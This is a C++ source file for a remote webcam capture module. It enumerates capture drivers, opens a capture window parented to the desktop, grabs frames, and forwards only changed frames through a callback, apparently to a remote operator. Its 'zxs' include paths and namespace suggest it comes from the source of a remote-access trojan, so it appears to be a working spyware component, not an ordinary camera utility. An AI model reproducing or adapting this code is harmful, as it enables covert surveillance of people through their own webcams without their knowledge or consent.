#include "remoteCap.h"
#include "..\..\zxsCommon\zxsWinAPI.h"

int capDevicesCount::GetCapDevCount()
{
	char szDeviceName[82];
	char szDeviceVersion[82];
	int t = 0;
	int wIndex = 0;
	//ZXSAPI::
	HANDLE hMutex = CreateMutex(NULL, FALSE, "enumcapdev");

	if(GetLastError() == ERROR_ALREADY_EXISTS)
		Sleep(500);
	WaitForSingleObject(hMutex, -1);

	for (; wIndex < 10; wIndex++) 
	{
		if (capGetDriverDescription (wIndex, 
			szDeviceName, 
			80, 
			szDeviceVersion, 
			80))
		{
			// Append name to list of installed capture drivers
			// and then let the user select a driver to use.

			t++;
		}
	}
	Sleep(500);
	ReleaseMutex(hMutex);

	return t;
}

capDrvDes::capDrvDes()
{
	idx = 0;
}

CAPDRV * capDrvDes::GetNextDriver()
{
	if(idx > 9)
		idx = 0;

	while(!capDrv[idx].bExisted)
	{
		if(++idx > 9)
		{
			idx = 0;
			return NULL;
		}
	}

	capIndex = idx++;

	return capDrv+capIndex;
}

int capDrvDes::init()
{
	int t = 0;
	//ZXSAPI::
	HANDLE hMutex = CreateMutex(NULL, FALSE, "enumcapdev");

	WaitForSingleObject(hMutex, -1);

	for (int wIndex = 0; wIndex < 10; wIndex++) 
	{
		if (capGetDriverDescription (wIndex, 
			capDrv[wIndex].szDeviceName, 
			80, 
			capDrv[wIndex].szDeviceVersion, 
			80))
		{
			// Append name to list of installed capture drivers
			// and then let the user select a driver to use.

			capDrv[wIndex].bExisted = 1;
			t++;
		}
	}
	Sleep(1000);
	ReleaseMutex(hMutex);
	return t;
}

///////////////////

CRemoteCap::CRemoteCap()
{
	memset(&BI, 0, sizeof(_BMPINFO));
	pbiBitInfo = (BITMAPINFO *)&BI;

	m_BmpUpdated = false;
	capInit = false;
	nCapDrv = 0;
}

CRemoteCap::~CRemoteCap()
{
	if(hWndVideo)
		CaptureStop();
}

int CRemoteCap::EnumDev()
{
	return nCapDrv = capDrivers.init();
}


int CRemoteCap::InitCapDevice(int idx)
{
	CAPDRIVERCAPS CapDrvCaps;
	
	if(GetCapDrvCount() == 0)
		return false;

	hWndVideo = ZXSAPI::capCreateCaptureWindow(
		"My Capture Window",
		WS_CHILD | WS_OVERLAPPEDWINDOW,
		0, 0, 160, 120,
		(HWND) GetDesktopWindow(),//����Ҹ����ھ����Ϊ��parent
		(int) 0);

	if(hWndVideo == NULL)
		return false;

	//ShowWindow(hWndVideo, SW_HIDE);

	BOOL bIsOk = capDriverConnect(hWndVideo, idx);
	if(!bIsOk)
	{
		::SendMessage(hWndVideo, WM_CLOSE, 0, 0);
		DestroyWindow(hWndVideo);
		return false;
	}

	bIsOk =  capDriverGetCaps(hWndVideo, &CapDrvCaps,  sizeof(CAPDRIVERCAPS));
	if(!bIsOk)
	{
		capDriverDisconnect(hWndVideo);
		return false;
	}

	if (CapDrvCaps.fHasOverlay) 
		capOverlay(hWndVideo, FALSE);

	//capCaptureSequenceNoFile(hWndVideo);
	if(!capSetUserData(hWndVideo, (DWORD)this))
		return false;
	
	if(!capSetCallbackOnFrame(hWndVideo, _capFrameCallBack))
	{
		return false;
	}

	if(!capSetCallbackOnError(hWndVideo, _capErrorCallBack))
	{	
		return false;
	}

	capInit = true;

	return true;
}

LRESULT CRemoteCap::_capFrameCallBack(HWND hWnd, LPVIDEOHDR lpVHdr)
{
	CRemoteCap *_this = (CRemoteCap*)capGetUserData(hWnd);

	return _this->capFrameCallBack(hWnd, lpVHdr);
}

LRESULT CRemoteCap::_capErrorCallBack(HWND hWnd, int nID, LPCSTR lpsz)
{
	CRemoteCap *_this = (CRemoteCap*)capGetUserData(hWnd);

	return _this->_capErrorCallBack(hWnd, nID, lpsz);
}

LRESULT CRemoteCap::capErrorCallBack(HWND hWnd, int nID, LPCSTR lpsz)
{
	//handles the error

	int flag = 3;

	if(!callbackFunc(CAPP_DEVICESTATUS, (BYTE*)&flag, sizeof(flag), cblParam))
		return 0;

	return 1;
}

int XORCHG(void *x, void *y, int bytes)
{
	int ret = 0;
	DWORD *a = (DWORD*)x;
	DWORD *b = (DWORD*)y;

	int mod = bytes%4;
	int dwSize = bytes/4;

	while(dwSize>0)
	{
		if(*a ^= *b)
			ret = 1;
		*b ^= *a;

		a++;
		b++;
		dwSize--;
	}

	BYTE *bx = (BYTE*)a;
	BYTE *by = (BYTE*)b;

	while(mod>0)
	{
		if(*bx ^= *by)
			ret = 1;
		*by ^= *bx;

		bx++;
		by++;
		mod--;
	}

	return ret;
}


LRESULT CRemoteCap::capFrameCallBack(HWND hWnd, LPVIDEOHDR lpVHdr)
{
	_BMPINFO bi;
	memset(&bi, 0, sizeof(bi));

	DWORD dwbiSize;
	dwbiSize = capGetVideoFormatSize(hWnd);
	capGetVideoFormat(hWnd, &bi, dwbiSize);

	if(memcmp(&bi, &BI, dwbiSize) != 0)
	{
		//
		memcpy(&BI, &bi, dwbiSize);

		if(!callbackFunc(CAPP_BITMAPINFO, (BYTE*)&BI, dwbiSize, cblParam))
			return 0;
	}

	if(!bmpbuf.checkBufferSize(lpVHdr->dwBytesUsed, true))
		return 0;

	if(XORCHG(lpVHdr->lpData, (BYTE*)bmpbuf, lpVHdr->dwBytesUsed))
		m_BmpUpdated = true;
	else
		m_BmpUpdated = false;

	if(m_BmpUpdated)
	{
		if(!callbackFunc(CAPP_UPDATEVIDEO, (BYTE*)lpVHdr->lpData, lpVHdr->dwBytesUsed, cblParam))
			return 0;
	}


	return 1;
}

int CRemoteCap::GetCurrentPixelBits()
{
	return BI.BitsPerPixel;
}

int CRemoteCap::GetFrame(MirrorCallBack pURCBFunc, void *FuncParam)
{
	if(capInit == false)
	{
		m_BmpUpdated = false;
		return 1;
	}

	callbackFunc = pURCBFunc;
	cblParam = FuncParam;

	capGrabFrameNoStop(hWndVideo);
	return 1;
}

int CRemoteCap::CaptureStop()
{
	if(capInit == false)
	{
		return 0;
	}
	capPreview(hWndVideo, FALSE);
	capDriverDisconnect(hWndVideo);
	capCaptureStop(hWndVideo);
	capCaptureSingleFrameClose(hWndVideo);
	::SendMessage(hWndVideo, WM_CLOSE, 0, 0);
	DestroyWindow(hWndVideo);

	hWndVideo = NULL;

	capInit = false;

	return 1;
}
